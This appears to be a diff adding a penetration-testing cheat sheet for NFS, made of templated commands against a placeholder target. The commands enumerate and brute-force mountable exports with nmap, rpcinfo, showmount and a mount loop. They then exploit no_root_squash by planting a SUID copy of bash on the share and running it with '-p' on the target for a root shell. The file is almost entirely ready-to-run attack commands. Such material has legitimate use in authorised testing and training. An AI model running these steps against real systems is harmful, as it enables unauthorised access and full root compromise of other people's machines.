@@ -1,0 +1,24 @@
+# === NMAP NFS SCRIPTS ===
+nmap -sV -p 2049 --script "nfs*" {{TARGET}}
+rpcinfo -p {{TARGET}}
+
+# === ENUMERATE EXPORTS ===
+showmount -e {{TARGET}}
+
+# === MOUNT ===
+mkdir /tmp/nfs
+# NFSv4 - no mountd needed
+mount -t nfs -o vers=4 {{TARGET}}:/ /tmp/nfs
+# NFSv3
+mount -t nfs -o vers=3 {{TARGET}}:/{{EXPORT}} /tmp/nfs
+# Brute common paths if showmount times out
+for path in / /home /srv /var /opt /backup /data /share /export /nfs; do mount -t nfs {{TARGET}}:$path /tmp/nfs 2>&1 && echo "SUCCESS: $path" && break; done
+
+# === NO_ROOT_SQUASH EXPLOITATION ===
+# Check exports for no_root_squash
+cat /etc/exports
+# If set - SUID a shell (as root on Kali, writing to mounted share)
+cp /bin/bash /tmp/nfs/tmp/bash
+chmod +s /tmp/nfs/tmp/bash
+# On target - execute
+/tmp/bash -p
